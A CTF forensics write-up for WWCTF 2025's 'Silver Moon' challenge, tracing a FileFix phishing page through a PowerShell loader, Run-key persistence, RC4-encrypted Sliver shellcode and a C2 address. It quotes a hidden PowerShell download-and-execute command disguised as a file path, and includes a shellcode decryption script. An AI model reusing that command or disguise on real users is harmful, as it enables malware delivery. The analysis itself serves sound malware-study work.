
---

title: WWCTF 2025

  

date: 2025-08-01

  

draft: false

  

description: "This page contain writeup for Silver Moon of forensic challenge from the WWCTF 2025."

  

summary: "This page contains WWCTF 2025 writeups, covering Silver Moon in the forensics category."

  

tags: ["ctf"]

  

categories: ["ctf"]

  

---

  

# Silver Moon

>Rumors whisper of a shadow moving beneath the Silver Moon. Investigate the strange occurrences and reveal the demon’s hidden technique before it’s too late 
> WARNING: Do not run the malware file on your PC.
> https://powershell.wwctf.com/

  

Flag: `wwf{f1l3f1x_t0_sl1v3r_b34c0n}`

  

#ctf #foresnic #malware

  

## File Fix Phishing Page

Upon visiting the page, we are served with [file fix](https://thehackernews.com/2025/06/new-filefix-method-emerges-as-threat.html) phishing page.

![](https://i.imgur.com/86LkQwl.png)


  

Upon copying the *fake file path*, the malicious script can be observed.

```Powershell

powershell -ep bypass -w hidden IEX(New-ObjEct System.Net.Webclient).Downloadstring('https://powershell.wwctf.com/update.ps1')                                                                                                                # C:\HR\Application.docx                                                                    

```

  

## Initial PowerShell Script

The malicious powershell loader contains a huge base64 encoded payload.

![](https://i.imgur.com/rLS1Ows.png)


![](https://i.imgur.com/kZxx2TE.png)


Summary of the powershell script:

1. Decode the base64 blob and creates a cmd script.

2. Creates a folder `J1Csum3Dcj` in the user's document directory

3. Drop the `update.exe` and add persistence via Run Key

  
  

## CMD Script

Decoding the initial base64 blob shows the cmd script, which contains the base64 encoded of the `update.exe`

![](https://i.imgur.com/iZ6ACh0.png)


  

## Extract update.exe

The `update.exe` can be extracted from the base64 encoded blob from the cmd script.

![](https://i.imgur.com/hy81MAr.png)


  

## Static Analysis (update.exe)

### Detect It Easy (DIE)

Shows as PE64 on DIE

![](https://i.imgur.com/fyhj2kW.png)


  

### Virus Total

On [VirusTotal](https://www.virustotal.com/gui/file/88d8aa69350b8516857c2fee3de800dc7e8afefd5660f27d3fadde51c349fdac) it was flagged by numerous vendors and tagged as [Sliver](https://github.com/BishopFox/sliver)

![](https://i.imgur.com/ALbwQtz.png)


  

### CAPA

From the CAPA output, the update.exe seems to be loading something to the memory with RWX permission.

![](https://i.imgur.com/N7inNcD.png)


  

### Decompile update.exe

Going through the main function of `update.exe`, it can be observed that it was performing some anti-analysis with timing checks.

![](https://i.imgur.com/OUD1TMx.png)


  

This is the part where it performs the setup for injection of the shellcode into memory.

```

if ( !VirtualProtect(&loc_140001520, 0xA82EDCui64, 0x40u, &flOldProtect) )
  {
    GetLastError();
    sub_140001010("Error: %d");
  }
```

  

Reading through the documentation of [VirtualProtect API](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect#parameters), we can get the following information:

Virtual address of the shellcode: `loc_140001520`

Size of the shellcode: `0xA82ED`

Memory protection option: RWX

![](https://i.imgur.com/yWmLZd5.png)


  

Going through the decompiled code, the shellcode was encrypted using RC4. So we can decrypt the shellcode from the virtual location that stores the shellcode.

  

Size and location of shellcode:

![](https://i.imgur.com/i7yxe4P.png)


RC4 Key `advapi32.dll`

![](https://i.imgur.com/FyzMGur.png)


  

### Extracting the shellcode

There are 2 ways to extract the shellcode.

#### **Method 1:**

  

As we already know the location of the shellcode, size and the RC4 key used. I feed ChatGPT with the decryption routine code from the decompiled code, and it generates the decryption script as below:

  

**Decryption Script:**

```python
import pefile

SHELLCODE_SIZE = 0xA82EDC
SHELLCODE_VA = 0x140001520  # Virtual address of encrypted shellcode
KEY = b"advapi32.dll"
EXE_NAME = "update.exe"
OUTPUT_NAME = "decrypted_shellcode.bin"

def initialize_sbox(key: bytes) -> list:
    sbox = list(range(256))
    j = 0
    for i in range(256):
        j = (j + sbox[i] + key[i % len(key)]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox

def rc4_like_decrypt(data: bytes, sbox: list) -> bytes:
    i = 0
    j = 0
    output = bytearray(len(data))
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + sbox[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
        k = sbox[(sbox[i] + sbox[j]) % 256]
        output[n] = data[n] ^ k
    return bytes(output)

def va_to_file_offset(pe: pefile.PE, va: int) -> int:
    rva = va - pe.OPTIONAL_HEADER.ImageBase
    return pe.get_offset_from_rva(rva)

def main():
    # Load PE file
    pe = pefile.PE(EXE_NAME)

    # Convert virtual address to file offset
    file_offset = va_to_file_offset(pe, SHELLCODE_VA)

    # Sanity check
    with open(EXE_NAME, "rb") as f:
        f.seek(file_offset)
        encrypted_data = f.read(SHELLCODE_SIZE)
        if len(encrypted_data) != SHELLCODE_SIZE:
            raise ValueError(f"Expected {SHELLCODE_SIZE} bytes, got {len(encrypted_data)}")

    print(f"[+] Read encrypted data from offset 0x{file_offset:X}")

    # Decrypt
    sbox = initialize_sbox(KEY)
    decrypted_data = rc4_like_decrypt(encrypted_data, sbox)

    # Write to output file
    with open(OUTPUT_NAME, "wb") as f:
        f.write(decrypted_data)

    print(f"[+] Decrypted shellcode saved to {OUTPUT_NAME}")

if __name__ == "__main__":
    main()

```

  

#### **Method 2:**

The second method is to execute the update.exe and use Process Hacker to view the memory region with RWX protection, and extract it that way. Learned this after reading [Omega-Squad Team](https://omega-squad.team/writeup/forensics-challenge-2025-4) writeup.

![](https://i.imgur.com/nAyVvD0.png)


The decrypted shellcode can be saved, this is easier method by using dynamic analysis.

  

Both method does contain the shellcode, but the second method does contain some null bytes before/after the shellcode.

![](https://i.imgur.com/34L4Oqh.png)


![](https://i.imgur.com/ptlcbmJ.png)


  

## Dynamic Analysis (update.exe)

Upon running the `update.exe` using [AnyRun](https://app.any.run/tasks/ce122340-99e3-4b4f-9ef5-fd7bfdfdbd23), nothing notable was observed but this outgoing traffic towards `192.168.75.130:80` at the `/authenticate/login.html` seems to be performing some authentication.

![](https://i.imgur.com/U9gNgnu.png)


  

## Flag obtained

Knowing the possible C2 IP, looking through the dumped shellcode binary, the flag can be seen from the query parameter `flag=` towards the IP `192.168.75.130`.

![](https://i.imgur.com/ZforeBG.png)


Decoding the base64 will show the flag.

![](https://i.imgur.com/mKJg7YQ.png)


Learned a lot from this challenge especially the dumping of shellcode part.